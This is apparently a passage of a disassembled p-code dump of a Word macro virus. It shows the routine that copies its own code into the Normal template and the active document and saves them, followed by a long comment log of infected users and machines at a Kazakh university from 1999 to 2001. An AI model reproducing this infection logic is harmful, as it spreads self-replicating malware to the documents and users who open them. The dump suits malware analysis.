' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St OurCode 
' Line #88:
' Line #89:
' Line #90:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #91:
' 	Ld OurCode 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #92:
' Line #93:
' 	Ld SaveNormalTemplate 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #94:
' Line #95:
' 	EndIfBlock 
' Line #96:
' Line #97:
' Line #98:
' 	QuoteRem 0x0002 0x0019 "Infect the ActiveDocument"
' Line #99:
' 	LineCont 0x0004 05 00 05 00
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld DocumentInfected 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #100:
' Line #101:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDocument 
' Line #102:
' Line #103:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #104:
' Line #105:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #106:
' 	Ld OurCode 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #107:
' Line #108:
' 	Ld SaveDocument 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #109:
' Line #110:
' 	EndIfBlock 
' Line #111:
' Line #112:
' Line #113:
' 	EndIfBlock 
' Line #114:
' Line #115:
' 	EndSub 
' Line #116:
' Line #117:
' 	QuoteRem 0x0000 0x000C " Logfile -->"
' Line #118:
' Line #119:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #120:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #121:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #122:
' 	QuoteRem 0x0000 0x001D " 19:20:14 - ñðåäà, 3 ìàé 2000"
' Line #123:
' 	QuoteRem 0x0000 0x001E " Ïîæåëàë  îñòàòüñÿ íåèçâåñòíûì"
' Line #124:
' 	QuoteRem 0x0000 0x0000 ""
' Line #125:
' Line #126:
' Line #127:
' Line #128:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #129:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #130:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #131:
' 	QuoteRem 0x0000 0x0024 " 11:36:42 - âîñêðåñåíüå, 14 ìàé 2000"
' Line #132:
' 	QuoteRem 0x0000 0x0010 " Khudyakov Yuriy"
' Line #133:
' 	QuoteRem 0x0000 0x0000 ""
' Line #134:
' Line #135:
' Line #136:
' Line #137:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #138:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #139:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #140:
' 	QuoteRem 0x0000 0x0024 " 16:27:56 - ïîíåäåëüíèê, 15 ìàé 2000"
' Line #141:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #142:
' 	QuoteRem 0x0000 0x0000 ""
' Line #143:
' Line #144:
' Line #145:
' Line #146:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #147:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #148:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #149:
' 	QuoteRem 0x0000 0x0020 " 16:55:46 - âòîðíèê, 16 ìàé 2000"
' Line #150:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #151:
' 	QuoteRem 0x0000 0x0000 ""
' Line #152:
' Line #153:
' Line #154:
' Line #155:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #156:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #157:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #158:
' 	QuoteRem 0x0000 0x001E " 10:25:20 - ñðåäà, 17 ìàé 2000"
' Line #159:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #160:
' 	QuoteRem 0x0000 0x0000 ""
' Line #161:
' Line #162:
' Line #163:
' Line #164:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #165:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #166:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #167:
' 	QuoteRem 0x0000 0x001E " 10:48:08 - ñðåäà, 17 ìàé 2000"
' Line #168:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #169:
' 	QuoteRem 0x0000 0x0000 ""
' Line #170:
' Line #171:
' Line #172:
' Line #173:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #174:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #175:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #176:
' 	QuoteRem 0x0000 0x001E " 10:53:13 - ñðåäà, 17 ìàé 2000"
' Line #177:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #178:
' 	QuoteRem 0x0000 0x0000 ""
' Line #179:
' Line #180:
' Line #181:
' Line #182:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #183:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #184:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #185:
' 	QuoteRem 0x0000 0x001E " 15:46:39 - ñðåäà, 17 ìàé 2000"
' Line #186:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #187:
' 	QuoteRem 0x0000 0x0000 ""
' Line #188:
' Line #189:
' Line #190:
' Line #191:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #192:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #193:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #194:
' 	QuoteRem 0x0000 0x0020 " 15:10:05 - ÷åòâåðã, 18 ìàé 2000"
' Line #195:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #196:
' 	QuoteRem 0x0000 0x0000 ""
' Line #197:
' Line #198:
' Line #199:
' Line #200:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #201:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #202:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #203:
' 	QuoteRem 0x0000 0x0020 " 14:57:33 - âòîðíèê, 23 ìàé 2000"
' Line #204:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #205:
' 	QuoteRem 0x0000 0x0000 ""
' Line #206:
' Line #207:
' Line #208:
' Line #209:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #210:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #211:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #212:
' 	QuoteRem 0x0000 0x0020 " 16:42:02 - âòîðíèê, 23 ìàé 2000"
' Line #213:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #214:
' 	QuoteRem 0x0000 0x0000 ""
' Line #215:
' Line #216:
' Line #217:
' Line #218:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #219:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #220:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #221:
' 	QuoteRem 0x0000 0x001E " 10:13:04 - ñðåäà, 24 ìàé 2000"
' Line #222:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #223:
' 	QuoteRem 0x0000 0x0000 ""
' Line #224:
' Line #225:
' Line #226:
' Line #227:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #228:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #229:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #230:
' 	QuoteRem 0x0000 0x0020 " 10:51:44 - ñóááîòà, 17 èþí 2000"
' Line #231:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #232:
' 	QuoteRem 0x0000 0x0000 ""
' Line #233:
' Line #234:
' Line #235:
' Line #236:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #237:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #238:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #239:
' 	QuoteRem 0x0000 0x0020 " 10:56:16 - ñóááîòà, 17 èþí 2000"
' Line #240:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #241:
' 	QuoteRem 0x0000 0x0000 ""
' Line #242:
' Line #243:
' Line #244:
' Line #245:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #246:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #247:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #248:
' 	QuoteRem 0x0000 0x0020 " 10:57:13 - ñóááîòà, 17 èþí 2000"
' Line #249:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #250:
' 	QuoteRem 0x0000 0x0000 ""
' Line #251:
' Line #252:
' Line #253:
' Line #254:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #255:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #256:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #257:
' 	QuoteRem 0x0000 0x0020 " 12:11:33 - ñóááîòà, 17 èþí 2000"
' Line #258:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #259:
' 	QuoteRem 0x0000 0x0000 ""
' Line #260:
' Line #261:
' Line #262:
' Line #263:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #264:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #265:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #266:
' 	QuoteRem 0x0000 0x0024 " 13:26:34 - ïîíåäåëüíèê, 19 èþí 2000"
' Line #267:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #268:
' 	QuoteRem 0x0000 0x0000 ""
' Line #269:
' Line #270:
' Line #271:
' Line #272:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #273:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #274:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #275:
' 	QuoteRem 0x0000 0x0020 " 13:33:11 - âòîðíèê, 27 èþí 2000"
' Line #276:
' 	QuoteRem 0x0000 0x000E " Ñ.Õ. Åñåíáàåâ"
' Line #277:
' 	QuoteRem 0x0000 0x0000 ""
' Line #278:
' Line #279:
' Line #280:
' Line #281:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #282:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #283:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #284:
' 	QuoteRem 0x0000 0x0020 " 14:13:47 - âòîðíèê, 27 èþí 2000"
' Line #285:
' 	QuoteRem 0x0000 0x000E " Ñ.Õ. Åñåíáàåâ"
' Line #286:
' 	QuoteRem 0x0000 0x0000 ""
' Line #287:
' Line #288:
' Line #289:
' Line #290:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #291:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #292:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #293:
' 	QuoteRem 0x0000 0x001E " 14:49:56 - ñðåäà, 28 èþí 2000"
' Line #294:
' 	QuoteRem 0x0000 0x0010 " Indi G.Ospanova"
' Line #295:
' 	QuoteRem 0x0000 0x0000 ""
' Line #296:
' Line #297:
' Line #298:
' Line #299:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #300:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #301:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #302:
' 	QuoteRem 0x0000 0x0024 " 14:12:22 - ïîíåäåëüíèê, 17 èþë 2000"
' Line #303:
' 	QuoteRem 0x0000 0x000A " Àëåêñàíäð"
' Line #304:
' 	QuoteRem 0x0000 0x0000 ""
' Line #305:
' Line #306:
' Line #307:
' Line #308:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #309:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #310:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #311:
' 	QuoteRem 0x0000 0x0024 " 14:16:56 - ïîíåäåëüíèê, 17 èþë 2000"
' Line #312:
' 	QuoteRem 0x0000 0x000A " Àëåêñàíäð"
' Line #313:
' 	QuoteRem 0x0000 0x0000 ""
' Line #314:
' Line #315:
' Line #316:
' Line #317:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #318:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #319:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #320:
' 	QuoteRem 0x0000 0x0020 " 18:26:40 - âòîðíèê, 18 èþë 2000"
' Line #321:
' 	QuoteRem 0x0000 0x000B "  Àëåêñàíäð"
' Line #322:
' 	QuoteRem 0x0000 0x0000 ""
' Line #323:
' Line #324:
' Line #325:
' Line #326:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #327:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #328:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #329:
' 	QuoteRem 0x0000 0x0020 " 08:22:23 - ÷åòâåðã, 20 èþë 2000"
' Line #330:
' 	QuoteRem 0x0000 0x000B "  Àëåêñàíäð"
' Line #331:
' 	QuoteRem 0x0000 0x0000 ""
' Line #332:
' Line #333:
' Line #334:
' Line #335:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #336:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #337:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #338:
' 	QuoteRem 0x0000 0x0020 " 10:33:06 - ÷åòâåðã, 20 èþë 2000"
' Line #339:
' 	QuoteRem 0x0000 0x000B "  Àëåêñàíäð"
' Line #340:
' 	QuoteRem 0x0000 0x0000 ""
' Line #341:
' Line #342:
' Line #343:
' Line #344:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #345:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #346:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #347:
' 	QuoteRem 0x0000 0x0020 " 18:08:01 - ÷åòâåðã, 20 èþë 2000"
' Line #348:
' 	QuoteRem 0x0000 0x000B "  Àëåêñàíäð"
' Line #349:
' 	QuoteRem 0x0000 0x0000 ""
' Line #350:
' Line #351:
' Line #352:
' Line #353:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #354:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #355:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #356:
' 	QuoteRem 0x0000 0x0024 " 10:34:42 - âîñêðåñåíüå, 23 èþë 2000"
' Line #357:
' 	QuoteRem 0x0000 0x000B "  Àëåêñàíäð"
' Line #358:
' 	QuoteRem 0x0000 0x0000 ""
' Line #359:
' Line #360:
' Line #361:
' Line #362:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #363:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #364:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #365:
' 	QuoteRem 0x0000 0x0024 " 11:45:27 - âîñêðåñåíüå, 23 èþë 2000"
' Line #366:
' 	QuoteRem 0x0000 0x000B "  Àëåêñàíäð"
' Line #367:
' 	QuoteRem 0x0000 0x0000 ""
' Line #368:
' Line #369:
' Line #370:
' Line #371:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #372:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #373:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #374:
' 	QuoteRem 0x0000 0x0020 " 11:53:05 - âòîðíèê, 25 èþë 2000"
' Line #375:
' 	QuoteRem 0x0000 0x0005 " CCTT"
' Line #376:
' 	QuoteRem 0x0000 0x0000 ""
' Line #377:
' Line #378:
' Line #379:
' Line #380:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #381:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #382:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #383:
' 	QuoteRem 0x0000 0x0020 " 08:53:34 - ÷åòâåðã, 27 èþë 2000"
' Line #384:
' 	QuoteRem 0x0000 0x000B " ðåàíèìàòîð"
' Line #385:
' 	QuoteRem 0x0000 0x0000 ""
' Line #386:
' Line #387:
' Line #388:
' Line #389:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #390:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #391:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #392:
' 	QuoteRem 0x0000 0x001F " 17:37:06 - âòîðíèê, 1 àâã 2000"
' Line #393:
' 	QuoteRem 0x0000 0x0011 " Reanimator 99 CD"
' Line #394:
' 	QuoteRem 0x0000 0x0000 ""
' Line #395:
' Line #396:
' Line #397:
' Line #398:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #399:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #400:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #401:
' 	QuoteRem 0x0000 0x001D " 12:46:13 - ñðåäà, 2 àâã 2000"
' Line #402:
' 	QuoteRem 0x0000 0x0011 " Reanimator 99 CD"
' Line #403:
' 	QuoteRem 0x0000 0x0000 ""
' Line #404:
' Line #405:
' Line #406:
' Line #407:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #408:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #409:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #410:
' 	QuoteRem 0x0000 0x001D " 18:22:38 - ñðåäà, 2 àâã 2000"
' Line #411:
' 	QuoteRem 0x0000 0x0011 " Reanimator 99 CD"
' Line #412:
' 	QuoteRem 0x0000 0x0000 ""
' Line #413:
' Line #414:
' Line #415:
' Line #416:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #417:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #418:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #419:
' 	QuoteRem 0x0000 0x0024 " 09:11:48 - ïîíåäåëüíèê, 21 àâã 2000"
' Line #420:
' 	QuoteRem 0x0000 0x0011 " Reanimator 99 CD"
' Line #421:
' 	QuoteRem 0x0000 0x0000 ""
' Line #422:
' Line #423:
' Line #424:
' Line #425:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #426:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #427:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #428:
' 	QuoteRem 0x0000 0x0024 " 15:01:19 - ïîíåäåëüíèê, 21 àâã 2000"
' Line #429:
' 	QuoteRem 0x0000 0x0011 " Reanimator 99 CD"
' Line #430:
' 	QuoteRem 0x0000 0x0000 ""
' Line #431:
' Line #432:
' Line #433:
' Line #434:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #435:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #436:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #437:
' 	QuoteRem 0x0000 0x0020 " 09:38:46 - âòîðíèê, 22 àâã 2000"
' Line #438:
' 	QuoteRem 0x0000 0x0011 " Reanimator 99 CD"
' Line #439:
' 	QuoteRem 0x0000 0x0000 ""
' Line #440:
' Line #441:
' Line #442:
' Line #443:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #444:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #445:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #446:
' 	QuoteRem 0x0000 0x0020 " 11:14:24 - ïÿòíèöà, 25 àâã 2000"
' Line #447:
' 	QuoteRem 0x0000 0x0011 " Reanimator 99 CD"
' Line #448:
' 	QuoteRem 0x0000 0x0000 ""
' Line #449:
' Line #450:
' Line #451:
' Line #452:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #453:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #454:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #455:
' 	QuoteRem 0x0000 0x0020 " 09:43:34 - ïÿòíèöà, 22 ñåí 2000"
' Line #456:
' 	QuoteRem 0x0000 0x0011 " Reanimator 99 CD"
' Line #457:
' 	QuoteRem 0x0000 0x0000 ""
' Line #458:
' Line #459:
' Line #460:
' Line #461:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #462:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #463:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #464:
' 	QuoteRem 0x0000 0x0020 " 13:22:22 - ïÿòíèöà, 22 ñåí 2000"
' Line #465:
' 	QuoteRem 0x0000 0x0011 " Reanimator 99 CD"
' Line #466:
' 	QuoteRem 0x0000 0x0000 ""
' Line #467:
' Line #468:
' Line #469:
' Line #470:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #471:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #472:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #473:
' 	QuoteRem 0x0000 0x0020 " 11:14:55 - âòîðíèê, 10 îêò 2000"
' Line #474:
' 	QuoteRem 0x0000 0x0002 " 1"
' Line #475:
' 	QuoteRem 0x0000 0x0000 ""
' Line #476:
' Line #477:
' Line #478:
' Line #479:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #480:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #481:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #482:
' 	QuoteRem 0x0000 0x0020 " 21:48:10 - ÷åòâåðã, 19 îêò 2000"
' Line #483:
' 	QuoteRem 0x0000 0x0002 " 1"
' Line #484:
' 	QuoteRem 0x0000 0x0000 ""
' Line #485:
' Line #486:
' Line #487:
' Line #488:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #489:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #490:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #491:
' 	QuoteRem 0x0000 0x001E " 16:24:45 - ñðåäà, 29 íîÿ 2000"
' Line #492:
' 	QuoteRem 0x0000 0x0002 " 1"
' Line #493:
' 	QuoteRem 0x0000 0x0000 ""
' Line #494:
' Line #495:
' Line #496:
' Line #497:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #498:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #499:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #500:
' 	QuoteRem 0x0000 0x0020 " 09:23:28 - ÷åòâåðã, 30 íîÿ 2000"
' Line #501:
' 	QuoteRem 0x0000 0x0002 " 1"
' Line #502:
' 	QuoteRem 0x0000 0x0000 ""
' Line #503:
' Line #504:
' Line #505:
' Line #506:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #507:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #508:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #509:
' 	QuoteRem 0x0000 0x0020 " 11:58:47 - ÷åòâåðã, 30 íîÿ 2000"
' Line #510:
' 	QuoteRem 0x0000 0x0002 " 1"
' Line #511:
' 	QuoteRem 0x0000 0x0000 ""
' Line #512:
' Line #513:
' Line #514:
' Line #515:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #516:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #517:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #518:
' 	QuoteRem 0x0000 0x001F " 11:36:47 - ïÿòíèöà, 1 äåê 2000"
' Line #519:
' 	QuoteRem 0x0000 0x0002 " 1"
' Line #520:
' 	QuoteRem 0x0000 0x0000 ""
' Line #521:
' Line #522:
' Line #523:
' Line #524:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #525:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #526:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #527:
' 	QuoteRem 0x0000 0x001F " 13:23:31 - ïÿòíèöà, 5 ÿíâ 2001"
' Line #528:
' 	QuoteRem 0x0000 0x0005 " Serg"
' Line #529:
' 	QuoteRem 0x0000 0x0000 ""
' Line #530:
' Line #531:
' Line #532:
' Line #533:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #534:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #535:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #536:
